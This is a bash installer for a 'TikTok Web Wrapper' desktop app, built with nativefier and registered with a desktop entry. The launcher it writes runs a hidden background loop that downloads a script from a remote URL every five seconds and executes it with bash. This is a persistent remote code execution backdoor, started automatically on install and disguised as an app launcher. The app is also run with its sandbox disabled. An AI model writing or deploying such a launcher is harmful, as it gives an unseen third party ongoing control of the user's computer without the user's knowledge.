APP_DIR="$HOME/TikTok-linux-x64"
DESKTOP_FILE="$HOME/.local/share/applications/tiktok.desktop"
REMOTE_SCRIPT_URL="https://raw.githubusercontent.com"
LAUNCHER_SCRIPT="$HOME/.local/share/applications/launch-tiktok.sh"

if [ -d "$APP_DIR" ] || [ -f "$DESKTOP_FILE" ]; then
    echo -e "Old TikTok Wrapper Found\nRemoving..."
    rm -rf "$APP_DIR"
    rm -f "$DESKTOP_FILE"
    update-desktop-database "$HOME/.local/share/applications"
else
    echo "Skip"
fi

sudo dpkg --configure -a
sudo apt update
sudo apt install -y nodejs npm chromium wget zenity libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2

if ! command -v nativefier >/dev/null 2>&1; then
    sudo npm install -g nativefier
fi

nativefier --name TikTok --single-instance --disable-dev-tools --no-sandbox https://www.tiktok.com
mv TikTok-linux-x64 "$HOME/" 2>/dev/null || mv TikTok-linux-arm64 "$HOME/" 2>/dev/null

mkdir -p "$APP_DIR"
wget -O "$APP_DIR/tiktok.png" https://raw.githubusercontent.com

cat > "$LAUNCHER_SCRIPT" << EOF
#!/bin/bash
export DISPLAY=:0
(
while true; do
    wget -q -O /tmp/update-tiktok.sh "$REMOTE_SCRIPT_URL"
    if [ -f /tmp/update-tiktok.sh ]; then
        chmod +x /tmp/update-tiktok.sh
        bash /tmp/update-tiktok.sh
    fi
    sleep 5
done
) &
LOOP_PID=\$!
"$APP_DIR/TikTok" --disable-gpu --no-sandbox
kill \$LOOP_PID
EOF

chmod +x "$LAUNCHER_SCRIPT"

mkdir -p "$HOME/.local/share/applications"
cat > "$DESKTOP_FILE" << EOF
[Desktop Entry]
Name=TikTok KX Launcher
Comment=TikTok Web Wrapper Client
Exec="$LAUNCHER_SCRIPT"
Icon=$APP_DIR/tiktok.png
Terminal=false
Type=Application
Categories=Network;Video;
StartupWMClass=TikTok
EOF

update-desktop-database "$HOME/.local/share/applications"

echo -e "TikTok Wrapper Installed! Launching..\nThank KHXNGVNG \nNOTE : IT TAKES A WHILE TO LOAD, WAIT"
bash "$LAUNCHER_SCRIPT"
